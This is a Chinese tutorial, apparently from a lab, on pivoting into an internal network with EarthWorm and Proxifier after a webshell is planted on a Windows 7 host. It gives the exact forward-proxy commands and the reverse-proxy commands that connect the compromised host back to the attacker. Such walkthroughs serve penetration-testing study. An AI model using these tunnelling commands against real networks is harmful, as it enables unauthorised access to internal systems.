EarthWorm结合proxifier搭建正反向代理链<br /> <br />大概思路<br />拿下一个shell后，想要访问这个shell主机的其他内网机器的服务，用earthworm作为一个流量转发，把ew对应的系统文件上传到这台有shell的主机进行正向或者反向的代理配置。使得攻击机可以通过这台有shell的主机在本地就可以访问目标内网其他机器<br /> <br />Earthworm是什么<br />网穿透神器 EarthWorm，(简称 EW) 是一套轻量便携且功能强大的网络穿透工具，基于标准 C 开发，具有 socks5 代理、端口转发和端口映射三大功能。<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1590908498737-419a873a-9cf1-41b9-a30c-8643cfbd28db.png#align=left&display=inline&height=137&originHeight=137&originWidth=649&status=done&style=none&width=649)<br />支持各种不同的系统环境<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1590908498867-5774d98b-9de4-4594-a067-3ce937deb10c.png#align=left&display=inline&height=196&originHeight=196&originWidth=183&status=done&style=none&width=183)<br /> <br />正向代理和反向代理用途的区别<br />正向代理的典型用途是为在防火墙内的局域网客户端提供访问Internet的途径。<br />反向代理的典型用途是将防火墙后面的服务器提供给Internet用户访问。<br /> <br /> <br />环境配置<br />简单配置好一个内网环境 [https://blog.csdn.net/weixin_41598660/article/details/106365740](https://blog.csdn.net/weixin_41598660/article/details/106365740)<br /> <br />Win10为攻击机， 靶机为win7(192.168.10.162，10.0.0.11)，win3（10.0.0.2）<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1590908498995-98da75ae-6a82-4be5-8340-ea825b29beb0.png#align=left&display=inline&height=282&originHeight=282&originWidth=592&status=done&style=none&width=592)<br />Win10 ping不通win3内网<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1590908499117-9b0d3a18-8357-4183-b2df-f3dd9f96a461.png#align=left&display=inline&height=180&originHeight=180&originWidth=485&status=done&style=none&width=485)<br />Win7和win3是同一个内网，能相互ping通，且win7能访问win3的内网web页面<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1590908499238-fbd5bbe9-ee4a-42cc-80e8-c3c8d2ad9376.png#align=left&display=inline&height=480&originHeight=486&originWidth=755&status=done&style=none&width=746)<br /> <br /> <br />正向代理模拟实战<br />Win10拿下了win7的webshell，并上传 earthworm的window执行文件<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1590908499362-f3aae41a-75a0-45b6-ba73-53861031fc87.png#align=left&display=inline&height=477&originHeight=622&originWidth=971&status=done&style=none&width=746)<br />虚拟一下终端！<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1590908499509-6de19ad6-dcac-4b75-bff2-a24531a98148.png#align=left&display=inline&height=437&originHeight=437&originWidth=531&status=done&style=none&width=531)<br />执行命令！<br />`Ew_for_Win.exe -s ssocksd -l 8002`<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1590908499636-838264f1-51d6-4346-81ec-43b2396f0a0a.png#align=left&display=inline&height=50&originHeight=50&originWidth=298&status=done&style=none&width=298)<br />` `<br />然后打开Proxifier工具，进行端口和SOCKS的配置<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1590908499795-f75043c3-f4c0-4dfe-a6dd-115e8aadc40d.png#align=left&display=inline&height=383&originHeight=525&originWidth=1025&status=done&style=none&width=746)<br />[05.30 23:43:38] WINWORD.EXE *64 - self.events.data.microsoft.com:443 打开通过代理 192.168.10.162:8002 SOCKS5<br />Chrome浏览器右击选择Proxifier代理打开页面。![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1590908499982-4e84d709-6871-4fae-9d25-156f8e4ce773.png#align=left&display=inline&height=87&originHeight=87&originWidth=554&status=done&style=none&width=554)<br /> <br />然后在浏览器输入win3内网web的地址，发现，win10能访问了！![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1590908500143-44dfdbd5-a651-4d46-950b-49007eedba6d.png#align=left&display=inline&height=392&originHeight=579&originWidth=1102&status=done&style=none&width=746)<br /> <br />反向代理<br />因为已经拿下了win7的shell，也已经上传了earthworth的window文件。所以进行一下反向代理<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1590908500279-09bf70d6-ff1c-40c4-9398-26f0abd084c9.png#align=left&display=inline&height=377&originHeight=469&originWidth=928&status=done&style=none&width=746)<br /> <br /> <br /> <br /> <br />Win10中 `ew_for_Win.exe -s rcsocks -l 1080 -e 8888`<br />`PS D:\ew\ew-master> .\ew_for_Win.exe -s rcsocks -l 1080 -e 8888`<br />`把代理1080端口（也可以是其他端口）转移到8888端口`![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1590908500444-c365b633-ced0-4d9f-bc25-2171a22a7f10.png#align=left&display=inline&height=141&originHeight=141&originWidth=511&status=done&style=none&width=511)<br />蚁剑中操作如下，让win7的发送一个反向代理的端口，对接到win10（192.168.10.1）<br />Ew_for_Win.exe -s rssocks -d 192.168.10.1 -e 8888<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1590908500554-85803642-7b36-48ae-9612-5e4846105f44.png#align=left&display=inline&height=288&originHeight=288&originWidth=420&status=done&style=none&width=420)<br />然后win10这边会有反应说ok<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1590908500680-00ebb3b6-1be1-4393-a28e-2679f7db7c35.png#align=left&display=inline&height=134&originHeight=134&originWidth=538&status=done&style=none&width=538)<br />然后再对Proxifier进行本地接收端口的配置<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1590908500860-4f3fa37b-dcd9-41d7-891a-e5099c8003ea.png#align=left&display=inline&height=480&originHeight=492&originWidth=766&status=done&style=none&width=746)<br /> <br />尝试访问内网03的web页面！成功<br /> <br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1590908501004-3538b860-9e52-4b8f-9708-d0e86580351e.png#align=left&display=inline&height=253&originHeight=351&originWidth=1033&status=done&style=none&width=746)<br /> <br /> <br />对内网10.0.0.2机器进行一个远程的连接！成功<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1590908501142-116a4329-e9a7-4a23-a236-19e3ccc39334.png#align=left&display=inline&height=426&originHeight=521&originWidth=912&status=done&style=none&width=746)
